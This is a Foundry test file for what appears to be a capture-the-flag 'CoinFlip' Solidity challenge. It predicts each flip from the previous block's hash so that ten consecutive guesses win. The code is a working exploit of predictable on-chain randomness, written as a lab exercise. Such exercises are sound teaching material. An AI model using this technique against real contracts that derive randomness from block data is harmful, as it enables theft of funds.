// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "src/CoinFlip.sol";


contract CoinFlipTest is Test {
    CoinFlip private flip;
    address private constant HACKER = address(0x1);
    uint256 FACTOR = 2;
    function setUp() external {
        flip = new CoinFlip();
        vm.deal(HACKER, 10e18);
        vm.startPrank(HACKER);
    }

    function testHack() external {
        vm.roll(2);

        for (uint i = 0; i< 10; i++) {
            uint blockValue = uint256(blockhash(block.number - 1));

            bool guess = blockValue/FACTOR == 1 ? true: false;
            flip.flip(guess);

            vm.roll(block.number + 1);
        }   
        assertEq(flip.consecutiveWins(), 10);
    }
}